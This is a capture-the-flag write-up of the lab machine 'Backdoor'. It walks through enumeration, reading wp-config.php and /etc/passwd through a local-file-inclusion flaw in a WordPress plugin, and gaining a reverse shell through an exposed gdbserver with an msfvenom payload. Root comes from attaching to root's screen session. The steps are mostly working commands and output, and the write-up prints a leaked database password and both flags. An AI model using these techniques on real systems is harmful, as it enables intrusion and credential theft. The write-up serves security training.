## Objectives
- user own
- system own

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sC -sV -A -T4 10.10.11.125`

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
```

Further scans reveal an additional port open:

```
PORT     STATE SERVICE VERSION
1337/tcp open  waste?
```

<br>

### Gobuster Scans

`gobuster dir -u http://10.10.11.125 -t 100 -r -x php,txt,html -w dir-med.txt`

```
/wp-signup.php        (Status: 200) [Size: 5840]
/wp-content           (Status: 200) [Size: 0]   
/wp-admin             (Status: 200) [Size: 5674]
/wp-login.php         (Status: 200) [Size: 5674]
/index.php            (Status: 200) [Size: 63830]
/wp-trackback.php     (Status: 200) [Size: 135]  
/wp-includes          (Status: 200) [Size: 52159]
/readme.html          (Status: 200) [Size: 7346]
/xmlrpc.php           (Status: 405) [Size: 42]   
/license.txt          (Status: 200) [Size: 19915]
```

`gobuster dir -u http://10.10.11.125/wp-content -t 70 -r -x php,txt,html -w dir-med.txt`

```
/index.php            (Status: 200) [Size: 0]
/plugins              (Status: 200) [Size: 1185]
/themes               (Status: 200) [Size: 0]   
/uploads              (Status: 200) [Size: 1156]
/upgrade              (Status: 200) [Size: 776]
```

I did not include a scan of **wp-includes** since we can easily view the files by navigating to the directory in the web browser.

## Website Digging

Visiting the main page with Wappalyzer results displayed:

![](images/backdoor1.png)

<br>

The **About, Blog, and Contact** links do anything and the page source doesn't have any interesting comments or info.

When clicking on the **Home** link it tries to point to **backdoor.htb** so I go and add it to my hosts file and visit the page, but it doesn't display anything other than the default home page.

Visiting the **wp-signup.php** page tells us that new user registration is not allowed currently. There's a lost password link on the page that let's you enter a username or email to reset the password on, and you can use this to enumerate valid user names. I try user **asdf** first and it tells me there is no account and then try user **admin** and it gives a different error message letting us know user **admin** is a valid account.

<br>

Visiting **wp-content** doesn't display anything (it had a size 0 in the gobuster scan). **wp-admin** and **wp-login.php** take us to the default WordPress login page.

**reame.html** leads us to the default WordPress installation instructions, and the **license.txt** is just that. **wp-includes** let's us browse the WordPress files but doesn't have aything interesting.

That leaves us with **wp-trackback.php** and **xmlrpc.php** which can be used to brute force login but after starting one and letting it run for awhile it was not able to find the admin password.

Let's check out the **wp-contents** directory.

Navigating to **plugins** shows us that there's a plugin called **ebook-download**.

Looking through that directory and opening the **readme.txt** file shows us that the plugin is **version 1.1**.

Looking through **/themes** and **/upgrade** show that they're empty. There are some additional directories in **uploads** but no files in them.

Not having found anything else I search for **ebook-download** exploits and find [**this exploit on exploit-db**](https://www.exploit-db.com/exploits/39575).

Looking over the exploit shows that the ebook-download plugin is vulerable to **LFI**. We can use the following example to view the contents of the **wp-config** file which will often times list usernames and passwords for the database:

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

The link above will download the file to your computer and opening it up shows us some credentials:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

I try to login to the admin and wordpressuser accounts on the webpage using the password above but have no luck. I also try and use mysql from the command line to connect over to the database but no luck there either.

The following will download the **/etc/passwd** file:

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd
```

It ends up that there are only 2 users with a shell on the system with root and:

```
user:x:1000:1000:user:/home/user:/bin/bash
```

I try to login as this user with the password from the wp-config.php file and am unable.

Taking a look at what's running on the system via the **sched_debug** file:

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/sched_debug
```

Not much interesting in there but the **gdbserver** does stand out.

```
runnable tasks:
S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
S      gdbserver 92258        30.771183       218   120         0.000000        25.481210         0.000000 0 0 /autogroup-142
```

Looking at what gdbserver is doing via the **cmdline** file associated with the gdbserver PID:

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/92258/cmdline
```

Shows us that gdbserver is running on **port 1337**. That explains what that is from our nmap scan earlier. Nmap was not able to tell us what exactly it was.

```
gdbserver--once0.0.0.0:1337/bin/trueuser@Backdoor:/proc/92258
```


<br>

## System Access

I do a search for gdbserver exploits and find [**this Hacktricks link**](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) explaining how you can exploit **gdbserver** to gain a shell. I run the steps below replacing the LHOST and target extended remote lines with the correct IP addresses and get a reverse shell back:

```
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

```
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [MY IP] from (UNKNOWN) [10.10.11.125] 52742
ls
binary.elf
user.txt
```

And upgrading my shell to make things a bit easier to use:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z to background our shell
stty raw -echo; fg
export TERM=xterm-256color

user@Backdoor:/home/user$
```

I then grab the **user.txt** flag:

`cat user.txt`

```
b6251f22124d32c64c1d0d21815dcfce
```

## System Enumeration

I upload **linPEAS** onto the system via a simple python http server and run it.

Immediately linPEAS shows us that it's vulnerable to **pwnkit** but given that's probably not the intended escalation path I'll skip that for now.

The other interesting thing I notice is that the **screen** program has a **SUID** bit set, and that isn't normal.

```
-rwsr-xr-x 1 root root 464K Feb 23  2021 /usr/bin/screen  --->  GNU_Screen_4.5.0
```

It also shows a running screen session started by root, so we should be able to attach to that.

```
root         828  0.0  0.0   2608  1756 ?        Ss   13:23   0:06      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
```

From the **screen** man page:

```
       -x   Attach to a not detached screen  session.  (Multi  display  mode).
            Screen  refuses  to attach from within itself.  But when cascading
            multiple screens, loops are not detected; take care.
```

<br>

## Root

Now that we know there's an already running screen session started by root, and that the -x option will attach to an already running session, let's connect over to it and escalate our privileges.

Running the following:

`screen -x root/root`

```
root@Backdoor:~# whoami
root
```

And getting our final **root.txt** flag:

`cat /root/root.txt`

```
a75bf28c8637281d1e82d5b989cfc7ab
```

<br>

With that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap** and **gobuster**
- Finding a vulnerable **WordPress** plugin and using **LFI** to view sensitive data through it
- Using **msfvenom** to create a reverse shell
- Exploiting a vulnerable **gdbserver** instance to obtain a reverse shell using **gdb**
- Using a **SUID** binary to escalate to root
